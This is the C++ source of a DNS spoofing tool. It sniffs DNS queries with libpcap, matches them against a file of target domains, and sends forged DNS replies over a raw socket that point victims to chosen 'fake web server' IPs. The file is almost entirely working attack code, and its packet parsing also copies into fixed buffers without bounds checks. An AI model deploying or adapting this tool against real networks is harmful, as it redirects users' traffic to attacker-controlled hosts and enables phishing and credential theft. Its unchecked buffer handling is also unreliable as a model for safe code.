#include "packet_handler.hpp"

void packet_handle::set_attack_info_file(char* file_name){
    this->attack_info_file=file_name;
}


int packet_handle::packet_capture_start(){
    struct bpf_program fcode;
    bpf_u_int32 mask;
    pcap_t *adhandle;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs, *d;

    std::vector<char*> interface_list;
    int select_interface_number;

    const char * filter = "port 53 and (udp and (udp[10] & 128 = 0))";     // Recv

    attack_list = read_info_from_file(attack_info_file);
    set_dom_and_ip(attack_list, fake_web_server_array, domain_array);

    if(attack_list.size()==0){
        return -1;
    }

    if (pcap_findalldevs(&alldevs, errbuf) < 0) {
        printf("pcap_findalldevs error\n");
        return -2;
    }

	for (d = alldevs; d; d = d->next) {
        if(d->next==NULL){
            break;
        }

        adhandle = pcap_open_live(d->name, 1000, 1, 300, errbuf);
		if (pcap_datalink(adhandle) == DLT_EN10MB && d->addresses != NULL) {
            interface_list.push_back(d->name);
		}
        pcap_close(adhandle);
	}

    printf("┌────┬─────────────┐\n");
    printf("│ No │ interface   │\n");
    printf("├────┼─────────────┤\n");
	for (int i = 0; i < interface_list.size(); i++) {
        printf("│ %-2d │ %-10s  │\n", i+1, interface_list[i]);
	}
    printf("└────┴─────────────┘\n");
    
	printf("Enter the interface number you would like to sniff : ");
	scanf("%d", &select_interface_number);

    if(select_interface_number <1 || select_interface_number > interface_list.size()){
        printf("ERROR: Network interface out of range\n");
        return -3;
    }    

    if (!(adhandle=pcap_open_live(interface_list[select_interface_number-1], 65536, 1, 1000, errbuf))) {
		fprintf(stderr, "ERROR: %s\n", pcap_geterr(adhandle));
        pcap_freealldevs(alldevs);
        return -4;
    }

	if (pcap_compile(adhandle, &fcode, filter, 1, mask) == -1) {
		fprintf(stderr, "ERROR: %s\n", pcap_geterr(adhandle));
        return -5;
	}

	if (pcap_setfilter(adhandle, &fcode) == -1) {
		fprintf(stderr, "ERROR: %s\n", pcap_geterr(adhandle));
		return -6;
	}

    my_ip = set_my_ip(interface_list[select_interface_number-1]);
    printf("┌───────────────────────────────────────────────────────────────────────────────────────────────────┐\n");
    printf("│            dns-spoofing: linstening on %d [udp dst port 53 and not src %15s]            │\n", select_interface_number, my_ip);
    printf("├────┬─────────────────┬───────┬─────────────────┬───────┬───────────┬────────┬───┬─────────────────┤\n");
    printf("│Info│    source ip    │ sport │ destination ip  │ dport │ Data size │   ID   │Q&A│   information   │\n");
    printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
    fflush(stdout);

    pcap_freealldevs(alldevs);

    while (1) {
        if ((pkt_data = pcap_next(adhandle, &header)) != NULL) {
            packet_handler();
        }
    }

    return 0;
}


void packet_handle::packet_handler() {
    struct pcap_pkthdr *header;
    const u_char *pkt_data;
    
    header = &(this->header);
    pkt_data = this->pkt_data;
    
    ether_header *eth = (ether_header*)(pkt_data);
    ip_header *ip = (ip_header*)(pkt_data+sizeof(ether_header));
    udp_header *udp = (udp_header*)(pkt_data+sizeof(ether_header)+sizeof(ip_header));
    dns_header *dns = (dns_header*)(pkt_data + 42);

    char extract_domain[1024];
    char fake_webserver_ip[16];
    memset(extract_domain, 0x00, 1024);
    make_domain(extract_domain);

    char source_ip[16];
    char dest_ip[16];

    int sport = ntohs(udp->sport);
    int dport = ntohs(udp->dport);
    int dns_id = ntohs(dns->ID);

    char display_domain[1024];
    unsigned char dns_response[1024];
    unsigned char *dns_reply_hdr;

    if(strcmp(extract_domain, "")!=0 && compare_domain(extract_domain, domain_array)){
        memset(display_domain, 0x00, 1024);
        memcpy(display_domain, extract_domain, 1024);
        if(strlen(display_domain)>16){
            for(int i=13;i<16;i++){
                display_domain[i]='.';
            }
            for(int i=16;i<strlen(display_domain);i++){
                display_domain[i]='\0';
            }
        }
        
        snprintf(source_ip, sizeof(source_ip), "%d.%d.%d.%d", ip->saddr.byte1, ip->saddr.byte2, ip->saddr.byte3, ip->saddr.byte4);
        snprintf(dest_ip, sizeof(dest_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);

        for (int j = 0; j < 101 ; j++) {
            printf("\b \b");
        }

        printf("├────┼─────────────────┼───────┼─────────────────┼───────┼───────────┼────────┼───┼─────────────────┤\n");
        printf("│Recv│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ Q │ %-16s│\n", source_ip, sport, dest_ip, dport, header->caplen,dns_id, display_domain);

        memset(dns_response, 0x00, 1024);
        dns_reply_hdr = dns_response + sizeof(ip_header) + sizeof(udp_header);

        dns_reply_hdr[0]=dns->ID & 0xff; dns_reply_hdr[1]=(dns->ID >> 8) & 0xff;
        dns_reply_hdr[2]=0x81; dns_reply_hdr[3]=0x80;
        dns_reply_hdr[4]=dns->QDCNT & 0xff; dns_reply_hdr[5]=(dns->QDCNT >> 8) & 0xff;
        dns_reply_hdr[6]=0x00; dns_reply_hdr[7]=0x01;
        dns_reply_hdr[8]=dns->NSCNT & 0xff; dns_reply_hdr[9]=(dns->NSCNT >> 8) & 0xff;
        dns_reply_hdr[10]=dns->ARCNT & 0xff; dns_reply_hdr[11]=(dns->ARCNT >> 8) & 0xff;
    
        int size = header->caplen-54-4;

        for(int i=0;i<size;i++){
            dns_reply_hdr[12+i]=pkt_data[i+54];
        }

        dns_reply_hdr[size+12]=0x00; dns_reply_hdr[size+13]=0x01; 
        dns_reply_hdr[size+14]=0x00; dns_reply_hdr[size+15]=0x01; 
        dns_reply_hdr[size+16]=0xc0; dns_reply_hdr[size+17]=0x0c;
        dns_reply_hdr[size+18]=0x00; dns_reply_hdr[size+19]=0x01;
        dns_reply_hdr[size+20]=0x00; dns_reply_hdr[size+21]=0x01;
        dns_reply_hdr[size+22]=0x00; dns_reply_hdr[size+23]=0x00;
        dns_reply_hdr[size+24]=0x00; dns_reply_hdr[size+25]=0x34;
        dns_reply_hdr[size+26]=0x00; dns_reply_hdr[size+27]=0x04;

        for(int i=0;i<domain_array.size();i++){
            if(strcmp(extract_domain, domain_array[i].c_str())==0){
                strcpy(fake_webserver_ip,attack_list[i].first.c_str());
            }
        }

        unsigned char ip_in_hex[4];
        sscanf(fake_webserver_ip, "%d.%d.%d.%d",(int *)&ip_in_hex[0],(int *)&ip_in_hex[1], (int *)&ip_in_hex[2], (int *)&ip_in_hex[3]); //copy arg to int array
        memcpy(&dns_reply_hdr[size+28], ip_in_hex, 4);

        int full_size = size+32;

        ip->tlen = htons(sizeof(ip_header) + sizeof(udp_header) + full_size);
        ip_address temp = ip->daddr;  
        ip->daddr = ip->saddr;
        ip->saddr = temp;

        int temp_port = udp->sport;
        udp->sport = htons(53);
        udp->dport = temp_port; 
        udp->len = htons(sizeof(udp_header) + full_size);

        udp->crc = 0;

        memcpy(&dns_response[0], (char *)ip, sizeof(ip_header));
        memcpy(&dns_response[sizeof(ip_header)], (char *)udp, sizeof(udp_header));

        char target_ip[16];
        snprintf(target_ip, sizeof(target_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);
        full_size = full_size + (sizeof(ip_header) + sizeof(udp_header));

        sned_dns_packet(target_ip, udp->dport, dns_response, full_size);
        
        printf("│Send│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ A │ %-16s│\n", my_ip, dport, source_ip, sport, full_size,dns_id, fake_webserver_ip);
        printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
        fflush(stdout);
    }
}


void packet_handle::sned_dns_packet(char *target_ip, int port, unsigned char *dns_packet,int size){
    struct sockaddr_in serv_addr;
    int sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    inet_pton(AF_INET, target_ip, &(serv_addr.sin_addr));
    int tmp = 1;

    if (setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
      printf("setsockopt hdrincl error\n");
    };

    int result = sendto(sfd, dns_packet, size, 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    if (result < 0) {
      printf("error sending udp %d\n", result);
    }
}


void packet_handle::make_domain(char *result){
    struct pcap_pkthdr *header;
    const u_char *pkt_data;
    
    header = &(this->header);
    pkt_data = this->pkt_data;

    ether_header *eth;
    ip_header *ip;
    udp_header *udp;
    dns_header *dns;

    eth = (ether_header*)(pkt_data);
    ip = (ip_header*)(pkt_data+sizeof(ether_header));
    udp = (udp_header*)(pkt_data+sizeof(ether_header)+sizeof(ip_header));
    dns = (dns_header*)(pkt_data + 42);
    const unsigned char *etc = pkt_data+42 +sizeof(dns_header);

    char dns_data[1024];
    memset(dns_data, 0x00, 1024);

    for(int i=0;i<header->caplen;i++){
        dns_data[i] = (unsigned int)pkt_data[i+54];
    }

    int size_before_dot = dns_data[0];
    int index = 0;
    int size_index = 1;

    while(size_before_dot > 0) {
        int i=0;

        while(i < size_before_dot) {
            result[index++] = dns_data[i+size_index];
            i++;
        }

        result[index++]='.';
        size_index=size_index+size_before_dot;
        size_before_dot = dns_data[size_index++];
    }

    result[--index]='\0';
}


char *packet_handle::set_my_ip(char *interface_name){
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface_name, IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}


bool packet_handle::compare_domain(const char *target_domain, std::vector<std::string> domain_array){
    for(int i=0;i<domain_array.size();i++){
        if(strcmp(target_domain, domain_array[i].c_str())==0){
            return true;
        }
    }

    return false;
}


void packet_handle::set_dom_and_ip(std::vector<std::pair<std::string, std::string> > attack_list, std::vector<std::string> &web_arr, std::vector<std::string> &dom_arr){
    std::vector<std::string> temp;
    
    for(int i=0;i<attack_list.size();i++){
        temp.push_back(attack_list[i].first);
    }
    web_arr = temp;
    temp.clear();

    for(int i=0;i<attack_list.size();i++){
        temp.push_back(attack_list[i].second);
    }
    dom_arr = temp;
    temp.clear();
}


std::vector<std::pair<std::string, std::string> > packet_handle::read_info_from_file(const char* file_name){
    std::vector<std::pair<std::string, std::string> > vec;

    FILE *fp;
    char line[256];
    fp = fopen(file_name, "r"); 

    if(fp==NULL){
        printf("Error: fail to open file\n");
        return vec;
    }

    int valid_cnt=0;
    int invalid_cnt=0;

    while(!feof(fp)){
        std::pair<std::string, std::string> temp;

        char *ch = fgets(line, 80, fp);

        if(ch!=NULL){
            char *ip = strtok(line, " ");
            char *domain = strtok(NULL, "\n");

            std::string str_ip(ip);
            std::string str_domain(domain);
            trim(str_domain);
            if(!validation_check_ip_addr(str_ip)){
                printf(ANSI_COLOR_RED   "==> Invalid[%-15s][%s]" ANSI_COLOR_RESET "\n", str_ip.c_str(), str_domain.c_str());
                invalid_cnt++;
            }else{
                printf(ANSI_COLOR_GREEN "==>   Valid[%-15s][%s]" ANSI_COLOR_RESET "\n", str_ip.c_str(), str_domain.c_str());
                temp = std::make_pair(str_ip, str_domain);

                vec.push_back(temp);
                valid_cnt++;
            }
        }
    }

    printf("Invalid [" ANSI_COLOR_RED "%d" ANSI_COLOR_RESET "], Valid [" ANSI_COLOR_GREEN "%d" ANSI_COLOR_RESET "]\n", invalid_cnt, valid_cnt);
    
    fclose(fp);
    return vec;
}


bool packet_handle::validation_check_ip_addr(std::string ip_addr){
    struct sockaddr_in sa;
    if(inet_pton(AF_INET, ip_addr.c_str(), &(sa.sin_addr))==1){
        return true;
    }else{
        return false;
    }
}


void packet_handle::trim(std::string& str) {
    str.erase(std::remove(str.begin(), str.end(), ' '), str.end());
}